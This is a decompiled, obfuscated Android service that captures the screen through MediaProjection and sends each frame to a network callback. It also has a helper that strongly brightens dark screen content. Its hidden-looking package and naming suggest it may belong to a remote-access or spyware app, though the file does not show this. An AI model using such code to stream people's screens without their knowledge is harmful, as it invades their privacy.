package com.storm.safe.rock.service;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.Paint;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;
import com.storm.safe.rock.service.modules.C0323a8;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.jvm.internal.Lambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0912ng;
import p000.h10;
import p000.t60;
import p000.tz0;
import p000.ue0;
import p000.ve0;
import p000.we0;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class MediaDisplayService extends Service {

    /* renamed from: c3 */
    public static volatile MediaDisplayService f52305c3;

    /* renamed from: c4 */
    public static volatile boolean f52306c4;

    /* renamed from: a0 */
    public MediaProjection f52309a0;

    /* renamed from: a1 */
    public C0281a1 f52310a1;

    /* renamed from: a2 */
    public ImageReader f52311a2;

    /* renamed from: a3 */
    public VirtualDisplay f52312a3;

    /* renamed from: a4 */
    public Display f52313a4;

    /* renamed from: a5 */
    public HandlerThread f52314a5;

    /* renamed from: a6 */
    public Handler f52315a6;

    /* renamed from: a7 */
    public int f52316a7;

    /* renamed from: a8 */
    public int f52317a8;

    /* renamed from: a9 */
    public int f52318a9;

    /* renamed from: b0 */
    public int f52319b0;

    /* renamed from: b1 */
    public we0 f52320b1;

    /* renamed from: b2 */
    public volatile boolean f52321b2;

    /* renamed from: b3 */
    public volatile boolean f52322b3;

    /* renamed from: b4 */
    public Lambda f52323b4;

    /* renamed from: b5 */
    public final AtomicInteger f52324b5 = new AtomicInteger(0);

    /* renamed from: b6 */
    public final AtomicInteger f52325b6 = new AtomicInteger(0);

    /* renamed from: b7 */
    public final AtomicLong f52326b7;

    /* renamed from: b8 */
    public final AtomicLong f52327b8;

    /* renamed from: b9 */
    public final AtomicInteger f52328b9;

    /* renamed from: c0 */
    public final C0873ms f52329c0;

    /* renamed from: c1 */
    public static final C0279a0 f52303c1 = new C0279a0(null);

    /* renamed from: c2 */
    public static volatile int f52304c2 = 20;

    /* renamed from: c5 */
    public static volatile int f52307c5 = 80;

    /* renamed from: c6 */
    public static volatile float f52308c6 = 0.8f;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.MediaDisplayService$a0 */
    public static final class C0279a0 {
        public /* synthetic */ C0279a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private final String getCHANNEL_ID() {
            return "OFF";
        }

        /* JADX INFO: Access modifiers changed from: private */
        public final int getNOTIFICATION_ID() {
            return 10086;
        }

        public static /* synthetic */ void start$default(C0279a0 c0279a0, Context context, int i, Intent intent, int i2, int i3, Object obj) {
            if ((i3 & 8) != 0) {
                i2 = 80;
            }
            c0279a0.start(context, i, intent, i2);
        }

        public final long getFrameIntervalMs() {
            return 1000 / AbstractC1117qo.m214413a9(getTargetFps(), 5, 30);
        }

        public final MediaDisplayService getInstance() {
            return MediaDisplayService.f52305c3;
        }

        public final int getQuality() {
            return MediaDisplayService.f52307c5;
        }

        public final float getScale() {
            return MediaDisplayService.f52308c6;
        }

        public final int getTargetFps() {
            return MediaDisplayService.f52304c2;
        }

        public final boolean isProjecting() {
            return MediaDisplayService.f52306c4;
        }

        public final void setQuality(int i) {
            MediaDisplayService.f52307c5 = i;
        }

        public final void setScale(float f) {
            MediaDisplayService.f52308c6 = f;
        }

        public final void setTargetFps(int i) {
            MediaDisplayService.f52304c2 = i;
        }

        public final void start(Context context, int i, Intent intent, int i2) {
            t60.m214695b6(context, "context");
            t60.m214695b6(intent, "data");
            Intent intent2 = new Intent(context, (Class<?>) MediaDisplayService.class);
            intent2.putExtra("action", "start");
            intent2.putExtra("resultCode", i);
            intent2.putExtra("data", intent);
            intent2.putExtra("quality", i2);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent2);
            } else {
                context.startService(intent2);
            }
        }

        public final void stop(Context context) {
            t60.m214695b6(context, "context");
            stopImmediate();
            Intent intent = new Intent(context, (Class<?>) MediaDisplayService.class);
            intent.putExtra("action", "stop");
            context.startService(intent);
        }

        public final void stopImmediate() {
            C0873ms c0873ms;
            InterfaceC0912ng interfaceC0912ng;
            ImageReader imageReader;
            MediaDisplayService.f52306c4 = false;
            MediaDisplayService c0279a0 = getInstance();
            if (c0279a0 != null) {
                c0279a0.f52323b4 = null;
            }
            try {
                MediaDisplayService c0279a02 = getInstance();
                if (c0279a02 != null && (imageReader = c0279a02.f52311a2) != null) {
                    imageReader.setOnImageAvailableListener(null, null);
                }
            } catch (Exception unused) {
            }
            try {
                MediaDisplayService c0279a03 = getInstance();
                if (c0279a03 == null || (c0873ms = c0279a03.f52329c0) == null || (interfaceC0912ng = c0873ms.f58395a0) == null) {
                    return;
                }
                AbstractC0780a0.m213689a0(interfaceC0912ng);
            } catch (Exception unused2) {
            }
        }

        private C0279a0() {
        }
    }

    public MediaDisplayService() {
        new AtomicInteger(0);
        this.f52326b7 = new AtomicLong(0L);
        this.f52327b8 = new AtomicLong(System.currentTimeMillis());
        this.f52328b9 = new AtomicInteger(0);
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        y21 y21Var = new y21();
        c1180rh.getClass();
        this.f52329c0 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c1180rh, y21Var));
    }

    /* renamed from: a0 */
    public static final Bitmap m211387a0(MediaDisplayService mediaDisplayService, Bitmap bitmap) {
        Bitmap.Config config;
        if (bitmap.getConfig() == Bitmap.Config.HARDWARE) {
            config = Bitmap.Config.ARGB_8888;
        } else {
            config = bitmap.getConfig();
            if (config == null) {
                config = Bitmap.Config.ARGB_8888;
            }
            t60.m214694b5(config, "bitmap.config ?: Bitmap.Config.ARGB_8888");
        }
        Bitmap bitmapCopy = bitmap.copy(config, true);
        Canvas canvas = new Canvas(bitmapCopy);
        Paint paint = new Paint();
        paint.setColorFilter(new ColorMatrixColorFilter(new ColorMatrix(new float[]{50.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 50.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 50.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f})));
        canvas.drawBitmap(bitmap, 0.0f, 0.0f, paint);
        t60.m214694b5(bitmapCopy, "result");
        return bitmapCopy;
    }

    /* JADX WARN: Type inference failed for: r1v3, types: [h10, kotlin.jvm.internal.Lambda] */
    /* renamed from: a1 */
    public static final void m211388a1(MediaDisplayService mediaDisplayService, byte[] bArr) {
        try {
            ?? r1 = mediaDisplayService.f52323b4;
            if (r1 != 0) {
                r1.invoke(bArr);
            } else {
                t60.m214726f4("ScreenProjectionSvc", "⚠️ [发送] onScreenshotCallback 未设置!");
            }
        } catch (Exception e) {
            tz0.m214807a7("❌ [发送] 失败: ", e.getMessage(), "ScreenProjectionSvc");
        }
    }

    /* renamed from: a2 */
    public final void m211389a2() {
        if (this.f52322b3) {
            return;
        }
        synchronized (this) {
            if (this.f52322b3) {
                return;
            }
            this.f52322b3 = true;
            f52306c4 = false;
            this.f52323b4 = null;
            try {
                ImageReader imageReader = this.f52311a2;
                if (imageReader != null) {
                    imageReader.setOnImageAvailableListener(null, null);
                }
            } catch (Exception unused) {
            }
            try {
                Handler handler = this.f52315a6;
                if (handler != null) {
                    handler.removeCallbacksAndMessages(null);
                }
            } catch (Exception unused2) {
            }
            new Thread(new ve0(this, 0)).start();
            t60.m214714d6("ScreenProjectionSvc", "🧹 [清理] 已启动后台清理线程");
        }
    }

    /* renamed from: a3 */
    public final void m211390a3(Intent intent) {
        int intExtra = intent != null ? intent.getIntExtra("resultCode", 0) : 0;
        Intent intent2 = intent != null ? (Intent) intent.getParcelableExtra("data") : null;
        f52307c5 = intent != null ? intent.getIntExtra("quality", 80) : 80;
        if (intent2 == null) {
            t60.m214704c5("ScreenProjectionSvc", "❌ [错误] 权限数据无效: resultCode=" + intExtra + ", data=" + intent2);
            stopSelf();
            return;
        }
        m211393a6();
        try {
            Object systemService = getSystemService("media_projection");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
            MediaProjection mediaProjection = ((MediaProjectionManager) systemService).getMediaProjection(intExtra, intent2);
            this.f52309a0 = mediaProjection;
            if (mediaProjection == null) {
                t60.m214704c5("ScreenProjectionSvc", "❌ [MediaProjection] 创建失败! resultCode=" + intExtra);
            } else {
                this.f52318a9 = getResources().getDisplayMetrics().densityDpi;
                Object systemService2 = getSystemService("window");
                t60.m214693b4(systemService2, "null cannot be cast to non-null type android.view.WindowManager");
                Display defaultDisplay = ((WindowManager) systemService2).getDefaultDisplay();
                this.f52313a4 = defaultDisplay;
                this.f52319b0 = defaultDisplay != null ? defaultDisplay.getRotation() : 0;
                DisplayMetrics displayMetrics = new DisplayMetrics();
                Display display = this.f52313a4;
                if (display != null) {
                    display.getRealMetrics(displayMetrics);
                }
                C0281a1 c0281a1 = new C0281a1(this);
                this.f52310a1 = c0281a1;
                MediaProjection mediaProjection2 = this.f52309a0;
                if (mediaProjection2 != null) {
                    mediaProjection2.registerCallback(c0281a1, this.f52315a6);
                }
                f52306c4 = true;
                m211391a4();
                we0 we0Var = new we0(this);
                this.f52320b1 = we0Var;
                if (we0Var.canDetectOrientation()) {
                    we0 we0Var2 = this.f52320b1;
                    if (we0Var2 != null) {
                        we0Var2.enable();
                    }
                } else {
                    t60.m214726f4("ScreenProjectionSvc", "⚠️ [旋转] 设备不支持旋转检测");
                }
            }
        } catch (Exception e) {
            t60.m214705c6("ScreenProjectionSvc", "❌ [MediaProjection] 初始化失败", e);
        }
        RunnableC0283a3 runnableC0283a3 = new RunnableC0283a3(this);
        Handler handler = this.f52315a6;
        if (handler != null) {
            handler.postDelayed(runnableC0283a3, 5000L);
        }
        RunnableC0282a2 runnableC0282a2 = new RunnableC0282a2(this);
        Handler handler2 = this.f52315a6;
        if (handler2 != null) {
            handler2.postDelayed(runnableC0282a2, 200L);
        }
    }

    /* renamed from: a4 */
    public final void m211391a4() {
        try {
            this.f52316a7 = 480;
            this.f52317a8 = 854;
            ImageReader imageReader = this.f52311a2;
            if (imageReader != null) {
                imageReader.close();
            }
            ImageReader imageReaderNewInstance = ImageReader.newInstance(this.f52316a7, this.f52317a8, 1, 6);
            this.f52311a2 = imageReaderNewInstance;
            if (imageReaderNewInstance != null) {
                imageReaderNewInstance.setOnImageAvailableListener(new C0280a0(this), this.f52315a6);
            }
            VirtualDisplay virtualDisplay = this.f52312a3;
            if (virtualDisplay != null) {
                virtualDisplay.release();
            }
            MediaProjection mediaProjection = this.f52309a0;
            VirtualDisplay virtualDisplayCreateVirtualDisplay = null;
            if (mediaProjection != null) {
                int i = this.f52316a7;
                int i2 = this.f52317a8;
                int i3 = this.f52318a9;
                ImageReader imageReader2 = this.f52311a2;
                virtualDisplayCreateVirtualDisplay = mediaProjection.createVirtualDisplay("ScreenProjection", i, i2, i3, 2, imageReader2 != null ? imageReader2.getSurface() : null, null, this.f52315a6);
            }
            this.f52312a3 = virtualDisplayCreateVirtualDisplay;
            if (virtualDisplayCreateVirtualDisplay == null) {
                t60.m214704c5("ScreenProjectionSvc", "❌ [VirtualDisplay] 创建失败!");
            }
        } catch (Exception e) {
            t60.m214705c6("ScreenProjectionSvc", "❌ [VirtualDisplay] 创建异常", e);
        }
    }

    /* renamed from: a5 */
    public final void m211392a5() {
        C0279a0 c0279a0 = f52303c1;
        try {
            Notification notificationM214961a2 = C1351vv.m214961a2(this);
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(c0279a0.getNOTIFICATION_ID(), notificationM214961a2, 32);
            } else {
                startForeground(c0279a0.getNOTIFICATION_ID(), notificationM214961a2);
            }
        } catch (Exception e) {
            t60.m214705c6("ScreenProjectionSvc", "❌ [前台服务] startForeground 失败", e);
            try {
                startForeground(c0279a0.getNOTIFICATION_ID(), C1351vv.m214961a2(this));
            } catch (Exception e2) {
                t60.m214705c6("ScreenProjectionSvc", "❌ [前台服务] 降级 startForeground 也失败", e2);
            }
        }
    }

    /* JADX WARN: Type inference failed for: r2v1, types: [com.storm.safe.rock.service.MediaDisplayService$trySetCallbackFrometzbzyzqxvqm$1, kotlin.jvm.internal.Lambda] */
    /* renamed from: a6 */
    public final void m211393a6() {
        if (this.f52323b4 != null) {
            return;
        }
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            final C0323a8 c0323a8M211471g5 = c0290a0 != null ? c0290a0.m211471g5() : null;
            if (c0323a8M211471g5 == null) {
                t60.m214726f4("ScreenProjectionSvc", "⚠️ [回调] NetworkManager 暂不可用，等待广播设置");
            } else {
                this.f52323b4 = new h10() { // from class: com.storm.safe.rock.service.MediaDisplayService$trySetCallbackFrometzbzyzqxvqm$1
                    {
                        super(1);
                    }

                    @Override // p000.h10
                    public final Object invoke(Object obj) {
                        byte[] bArr = (byte[]) obj;
                        t60.m214695b6(bArr, "frameData");
                        try {
                            c0323a8M211471g5.m211665d1(bArr);
                        } catch (Exception e) {
                            t60.m214705c6("ScreenProjectionSvc", "❌ 发送帧数据失败", e);
                        }
                        return C1351vv.f60710b1;
                    }
                };
                t60.m214714d6("ScreenProjectionSvc", "✅ [回调] 已主动从 NetworkManager 设置回调");
            }
        } catch (Exception e) {
            tz0.m214810b0("⚠️ [回调] 主动设置失败，等待广播: ", e.getMessage(), "ScreenProjectionSvc");
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        f52305c3 = this;
        HandlerThread handlerThread = new HandlerThread("ScreenProjectionHandler");
        handlerThread.start();
        this.f52315a6 = new Handler(handlerThread.getLooper());
        this.f52314a5 = handlerThread;
        C1351vv.m214962a3(this);
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.f52323b4 = null;
        try {
            ImageReader imageReader = this.f52311a2;
            if (imageReader != null) {
                imageReader.setOnImageAvailableListener(null, null);
            }
        } catch (Exception unused) {
        }
        try {
            AbstractC0780a0.m213689a0(this.f52329c0.f58395a0);
        } catch (Exception unused2) {
        }
        m211389a2();
        try {
            AbstractC1117qo.m214410a3(this.f52329c0);
        } catch (Exception e) {
            t60.m214705c6("ScreenProjectionSvc", "❌ [销毁] 取消处理协程失败", e);
        }
        try {
            HandlerThread handlerThread = this.f52314a5;
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            this.f52314a5 = null;
            this.f52315a6 = null;
        } catch (Exception e2) {
            t60.m214705c6("ScreenProjectionSvc", "❌ [销毁] 退出 HandlerThread 失败", e2);
        }
        f52305c3 = null;
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        String stringExtra = intent != null ? intent.getStringExtra("action") : null;
        if (!t60.m214686a2(stringExtra, "start")) {
            if (t60.m214686a2(stringExtra, "stop")) {
                m211389a2();
                stopSelf();
                return 1;
            }
            if (Build.VERSION.SDK_INT >= 26) {
                m211392a5();
            }
            return 1;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            m211392a5();
        }
        if (!this.f52322b3) {
            m211390a3(intent);
            return 1;
        }
        t60.m214726f4("ScreenProjectionSvc", "⏳ [启动] 正在清理中，等待完成...");
        new Thread(new ue0(this, intent, 0)).start();
        return 1;
    }
}
